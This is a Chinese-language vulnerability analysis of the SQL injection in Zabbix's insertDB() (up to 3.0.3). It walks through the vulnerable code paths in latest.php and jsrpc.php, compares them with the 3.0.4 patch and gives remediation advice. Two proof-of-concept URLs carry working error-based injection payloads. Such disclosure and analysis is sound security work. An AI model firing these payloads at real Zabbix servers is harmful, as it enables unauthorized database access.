# Zabbix insertDB()注入漏洞分析
## 一、漏洞概述

### 1. 漏洞简介

Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位、解决存在的各种问题。

由于`insertDB()`函数对可控参数过滤不当，导致SQL注入。

### 2. 漏洞影响
攻击者可以在通过SQL注入获取数据库的访问权限。攻击者以管理员身份登陆后台后，可以实现在放置数据库的服务器执行任意系统命令。  

### 3. 漏洞触发条件
版本：`2.0.x`、`2.2.x`、`2.4.x`、`2.5`、`3.0.0-3.0.3`
登陆：以下两种触发方式，都需要系统未关闭默认开启的guest账户登陆，或者拥有其他可登陆的账户。

## 二、漏洞复现（以3.0.3为例）

### 1. 环境搭建
Docker
ubuntu 14.04
zabbix `3.0.3` 源码编译安装

`tar -zxvf zabbix-3.0.3.tar.gz`  

`cd zabbix-3.0.3/database/mysql`

配置数据库：
```
shell> mysql -uroot -p<password>
mysql> create database zabbix character set utf8 collate utf8_bin;
mysql> grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';
mysql> quit;
shell> mysql -uzabbix -pzabbix zabbix < schema.sql
# stop here if you are creating database for Zabbix proxy
shell> mysql -uzabbix -p<password> zabbix < images.sql
shell> mysql -uzabbix -p<password> zabbix < data.sql
```

编译：
`./configure --enable-server --enable-agent --enable-java --with-unixodbc --with-mysql --with-libcurl --with-libxml2 --with-openssl --with-net-snmp --with-ldap`

编译过程可能遇到如下依赖问题：  

1. configure: error: MySQL library not found  
`apt-get install libmysqld-dev`

2. configure: error: unixODBC library not found  
`apt-get install unixodbc-dev`

3. configure: error: Curl library not found  
`apt-get install libcurl3-dev`

4. configure: error: Unable to find "javac"executable in path  
`apt-get install openjdk-7-jdk`

5. configure: error: Invalid Net-SNMP directory - unableto find net-snmp-config  
`apt-get install libsnmp-dev,snmp`

6. configure: error: Invalid LDAP directory - unable tofind ldap.h  
`apt-getinstall libldap2-dev`

安装：
`make install`

修改zabbix server配置文件：
```
# vi /etc/zabbix/zabbix_server.conf
DBHost=localhost
DBName=zabbix
DBUser=zabbix
DBPassword=zabbix
```

前端配置文件：
```
# vi /etc/apache2/conf-enabled/zabbix.conf
php_value max_execution_time 300
php_value memory_limit 128M
php_value post_max_size 16M
php_value upload_max_filesize 2M
php_value max_input_time 300
php_value always_populate_raw_post_data -1
php_value date.timezone Asia/Shanghai
```

安装前端：
在浏览器打开，http:/<ip>/zabbix按提示进行安装
![](https://www.zabbix.com/documentation/3.0/_media/manual/installation/install_2.png)

### 2. 漏洞函数分析
该漏洞函数为`CProfile.php`中277行的`insertDB()`：
```
private static function insertDB($idx, $value, $type, $idx2) {
	$value_type = self::getFieldByType($type);

	$values = [
		'profileid' => get_dbid('profiles', 'profileid'),
		'userid' => self::$userDetails['userid'],
		'idx' => zbx_dbstr($idx),
		$value_type => zbx_dbstr($value),
		'type' => $type,
		//关键点，可控变量，未用zbx_dbstr()进行过滤
		'idx2' => $idx2
	];

	return DBexecute('INSERT INTO profiles ('.implode(', ', array_keys($values)).') VALUES ('.implode(', ', $values).')');
}
```
`zbx_dbstr()`实际上就是`mysql_real_escape_string()`，会对单引号、双引号等特殊字符做转义
```
function zbx_dbstr($var) {
	......
	switch ($DB['TYPE']) {
	......
		case ZBX_DB_MYSQL:
			if (is_array($var)) {
				foreach ($var as $vnum => $value) {
					$var[$vnum] = "'".mysqli_real_escape_string($DB['DB'], $value)."'";
				}
				return $var;
			}
			return "'".mysqli_real_escape_string($DB['DB'], $var)."'";

```
`insertDB()`调用`db.inc.php`中499行的`DBexecute()`也没有进行过滤，直接执行：
```
fu1nction DBexecute($query, $skip_error_messages = 0) {
	......
	case ZBX_DB_MYSQL:
	//关键点，未过滤，直接执行查询函数
	if (!$result = mysqli_query($DB['DB'], $query)) {
		error('Error in query ['.$query.'] ['.mysqli_error($DB['DB']).']');
	}
	break;
	......
}
```
注意`$idx2`可控，未被过滤，为第4个参数

### 3. latest.php页面漏洞触发分析

#### 3.1 漏洞代码分析
`latest.php`中，70行
```
if (hasRequest('favobj')) {
	if ($_REQUEST['favobj'] == 'toggle') {
		if (!is_array($_REQUEST['toggle_ids'])) {
			if ($_REQUEST['toggle_ids'][1] == '_') {
				$hostId = substr($_REQUEST['toggle_ids'], 2);
				CProfile::update('web.latest.toggle_other', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $hostId);
			}
			else {
				$applicationId = $_REQUEST['toggle_ids'];
				CProfile::update('web.latest.toggle', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $applicationId);
			}
		}
		else {
			foreach ($_REQUEST['toggle_ids'] as $toggleId) {
				if ($toggleId[1] == '_') {
					$hostId = substr($toggleId, 2);
					CProfile::update('web.latest.toggle_other', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $hostId);
				}
				else {
					$applicationId = $toggleId;
					CProfile::update('web.latest.toggle', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $applicationId);
				}
			}
		}
	}
}
```
提交参数`favobj=toggle`时传入的数组参数`toggle_ids`总是能进入`CProfile::update()`中的第4个参数，跟进`CProfile.php`中209行：
```
public static function update($idx, $value, $type, $idx2 = 0) {
	......
	if (is_null($current)) {
		if (!isset(self::$insert[$idx])) {
			self::$insert[$idx] = [];
		}
		self::$insert[$idx][$idx2] = $profile;
	}
	else {
		if ($current != $value) {
			if (!isset(self::$update[$idx])) {
				self::$update[$idx] = [];
			}
			self::$update[$idx][$idx2] = $profile;
		}
	}
	if (!isset(self::$profiles[$idx])) {
		self::$profiles[$idx] = [];
	}
	self::$profiles[$idx][$idx2] = $value;
	......
}
```
`update()`对一系列成员变量进行赋值更新  

**传入的`toggle_ids`成为`$idx2`这个变量，该变量可控**  

回到`latest.php`中99行，`page_footer.php`被包含进来执行

```
if((PAGE_TYPE_JS == $page['type']) || (PAGE_TYPE_HTML_BLOCK == $page['type'])){
	require_once dirname(__FILE__).'/include/page_footer.php';
	exit;
}
```
跟进到`page_footer.php`，38行
```
if (CProfile::isModified()) {
	DBstart();
	$result = CProfile::flush();
	DBend($result);
}
```
跟到`CProfile.php`中，`isModified()`定义：
```
public static function isModified() {
		return (self::$insert || self::$update);
	}
```
`latest.php`中70行代码块调用`CProfile::update()`对`$insert`
、`$update`等进行赋值，所以该`latest.php`会执行到上面的if语句块中  

if语句块中第二句调用`CProfile::flush()`，从`CProfile::$insert`中取出相应的值，并进行insertDB操作：
```
public static function flush() {
	......
	foreach (self::$insert as $idx => $profile) {
		foreach ($profile as $idx2 => $data) {
			$result &= self::insertDB($idx, $data['value'], $data['type'], $idx2);
		}
	}
	......
	return $result;
}
```
最终调用了存在SQL注入的`insertDB()`，`$idx2`可控

总结调用流程：
`latest.php: $_REQUEST['toggle_ids']   --->    CProfile::update()   --->    require_once()   --->   CProfile::flush()   --->   CProfile::insertDB()   --->   CProfile::DBexecute()`

PoC:
需要在登陆的时候抓包取得sid，或者从登陆后的页面源码中取得sid(仅3.0.x适用)
```
.../zabbix/latest.php?output=ajax&sid=b5ddf30e6b2e5899&favobj=toggle&toggle_open_state=1&toggle_ids[]=6666+or+updatexml(1,concat(0x23,(select+user()),0x23),1)+or+1=1)%23
```

#### 3.2 补丁对比
zabbix 最新版3.0.4中，删除了`latest.php`从外部获取`toggle_ids`的代码，没有了可控的参数，这个点已经`无法注入`

同时修复了`CProfile::insertDB()`的缺陷，增加了对`$idx2`的过滤。
```
// zabbix 3.0.3 CProfile.php 277行
private static function insertDB($idx, $value, $type, $idx2) {
	$value_type = self::getFieldByType($type);
	$values = [
		'profileid' => get_dbid('profiles', 'profileid'),
		'userid' => self::$userDetails['userid'],
		'idx' => zbx_dbstr($idx),
		$value_type => zbx_dbstr($value),
		'type' => $type,
		//关键点，未进行过滤
		'idx2' => $idx2
	];
	......
}
```
```
// zabbix 3.0.4 CProfile.php 277行
private static function insertDB($idx, $value, $type, $idx2) {
	$value_type = self::getFieldByType($type);
	$values = [
		'profileid' => get_dbid('profiles', 'profileid'),
		'userid' => self::$userDetails['userid'],
		'idx' => zbx_dbstr($idx),
		$value_type => zbx_dbstr($value),
		'type' => $type,
		//关键点，使用zbx_dbstr()进行过滤
		'idx2' => zbx_dbstr($idx2)
	];
	......
}
```


### 4. jsrpc.php页面漏洞触发分析

#### 4.1 漏洞代码分析
`jsrpc.php`中180行
```
......
if ($requestType == PAGE_TYPE_JSON) {
	$http_request = new CHttpRequest();
	$json = new CJson();
	$data = $json->decode($http_request->body(), true);
}
else {
	//关键点，获取输入参数
	$data = $_REQUEST;
}
......
if (!is_array($data) || !isset($data['method'])
		|| ($requestType == PAGE_TYPE_JSON && (!isset($data['params']) || !is_array($data['params'])))) {
	fatal_error('Wrong RPC call to JS RPC!');
}
......
switch ($data['method']) {
	case 'host.get':
	......
	case 'message.mute':
	.......
	case 'screen.get':
		$result = '';
		//关键点
		$screenBase = CScreenBuilder::getScreen($data);
		if ($screenBase !== null) {
			$screen = $screenBase->get();

			if ($data['mode'] == SCREEN_MODE_JS) {
				$result = $screen;
			}
			else {
				if (is_object($screen)) {
					$result = $screen->toString();
				}
			}
		}
	......
	}
......
```
**`$data`获得所有传入参数，可控**   

`type`必须传入，且不能为常量`PAGE_TYPE_JSON`(6)，`defines.inc.php`中定义常量   

当`method`赋值为`screen.get`，调用`CScreenBuilder::getScreen($data)`，跟进到`CScreenBuilder.php`中171行：
```
public static function getScreen(array $options = []) {
	......
	if ($options['resourcetype'] === null) {
				return null;
			}
	switch ($options['resourcetype']) {
		case SCREEN_RESOURCE_GRAPH:
			return new CScreenGraph($options);
		......
		case SCREEN_RESOURCE_DISCOVERY:
			return new CScreenDiscovery($options);
		default:
			return null;
		}
}
```
提交参数时如果设置`resourcetype`，然后一系列可能的返回都是一个继承自`CScreenBase`的实例，以resourcetype=17为例，CScreenHostTriggers无自己的构造方法，实例化的时候将执行父类CScreenBase的构造方法.
```
class CScreenHostTriggers extends CScreenBase {.....}
class CScreenHistory extends CScreenBase {......)
```
跟进到`CScreenBase.php`中的构造方法：
```
public function __construct(array $options = []) {
	......
	// Get resourcetype.
	if ($this->resourcetype === null && array_key_exists('resourcetype',$this->screenitem)) {
		$this->resourcetype = $this->screenitem['resourcetype'];
	}
	foreach ($this->parameters as $pname => $default_value) {
		if ($this->required_parameters[$pname]) {
			$this->$pname = array_key_exists($pname, $options) ? $options[$pname] : $default_value;
		}
	}

	// Get page file.
	if ($this->required_parameters['pageFile'] && $this->pageFile === null) {
		global $page;
		$this->pageFile = $page['file'];
	}

	// Calculate timeline.
	if ($this->required_parameters['timeline'] && $this->timeline === null) {
		//关键函数调用calculateTime()
		$this->timeline = $this->calculateTime([
			'profileIdx' => $this->profileIdx,
			//关键参数
			'profileIdx2' => $this->profileIdx2,
			'updateProfile' => $this->updateProfile,
			'period' => array_key_exists('period', $options) ? $options['period'] : null,
			'stime' => array_key_exists('stime', $options) ? $options['stime'] : null
		]);
	}
}
```
如果传入`profileIdx2`参数，它将未经任何过滤地传给`CScreenBase::calculateTime()`，跟进到`CScreenBase.php`中425行
```
public static function calculateTime(array $options = []) {
......
if ($options['updateProfile'] && !empty($options['profileIdx'])) {
		//关键点
		CProfile::update($options['profileIdx'].'.period', $options['period'], PROFILE_TYPE_INT, $options['profileIdx2']);
			}
	......
}
```
发现`CProfile::update()`被调用，且`$options['profileIdx2']`为第4个参数，即形参`$idx2`。如果再`insertDB()`被调用时，`profileIdx2`参数被带进最终执行语句.   

返回到`jsrpc.php`中调用`CScreenBuilder::getScreen($data)`后的部分
```
$screenBase = CScreenBuilder::getScreen($data);
if ($screenBase !== null) {
	$screen = $screenBase->get();

	if ($data['mode'] == SCREEN_MODE_JS) {
		$result = $screen;
	}
	else {
		if (is_object($screen)) {
			$result = $screen->toString();
		}
	}
}
```
`$screenBase`不能为null意味着必须设置`resourcetype`参数
要使参数提交结果返回，需要设置`mode`参数不为3或者不设置   

`jsrpc.php`末尾包含进`page_footer.php`，最终调用缺陷函数`CProfile::insertDB()`，`profileIdx2`参数被执行，产生注入.   

总结调用流程：
`$data = $_REQUEST   --->    CScreenBuilder::getScreen()   --->    CScreenBase::__construct()   --->    CScreenBase::calculateTime()   --->   CProfile::update()   --->   CScreenBase::get()   --->   require_once()   --->   CProfile::flush()   --->   CProfile::insertDB()   --->   CProfile::DBexecute()`   

PoC: 
```
.../zabbix/jsrpc.php?type=9&method=screen.get&profileIdx=1&updateProfile=1&mode=2&screenid=&groupid=&hostid=0&pageFile=1&action=showlatest&filter=&filter_task=&mark_color=1&resourcetype=16&profileIdx2=666+or+updatexml(1,concat(0x23,(select+user()),0x23),1)+or+1=1)%23
```

#### 4.2 补丁对比
zabbix 最新版3.0.4中，没有对`jsrpc.php`页面进行任何改动，仍然能传入任意参数。但是修复了`CProfile::insertDB()`的缺陷，增加了对`$idx2`的过滤。
```
// zabbix 3.0.3 CProfile.php 277行
private static function insertDB($idx, $value, $type, $idx2) {
	$value_type = self::getFieldByType($type);
	$values = [
		'profileid' => get_dbid('profiles', 'profileid'),
		'userid' => self::$userDetails['userid'],
		'idx' => zbx_dbstr($idx),
		$value_type => zbx_dbstr($value),
		'type' => $type,
		//关键点，未进行过滤
		'idx2' => $idx2
	];
	......
}
```
```
// zabbix 3.0.4 CProfile.php 277行
private static function insertDB($idx, $value, $type, $idx2) {
	$value_type = self::getFieldByType($type);
	$values = [
		'profileid' => get_dbid('profiles', 'profileid'),
		'userid' => self::$userDetails['userid'],
		'idx' => zbx_dbstr($idx),
		$value_type => zbx_dbstr($value),
		'type' => $type,
		//关键点，使用zbx_dbstr()进行过滤
		'idx2' => zbx_dbstr($idx2)
	];
	......
}
```

### 5. 修复意见
1. 更新到最新3.0.4版本，补丁详情：https://support.zabbix.com/browse/ZBX-11023
2. 禁用guest登陆功能
3. 修改管理员账户默认密码

## 三、参考
* https://www.seebug.org/vuldb/ssvid-92301
* https://www.seebug.org/vuldb/ssvid-92302
* https://support.zabbix.com/browse/ZBX-11023
* https://packetstormsecurity.com/files/138312
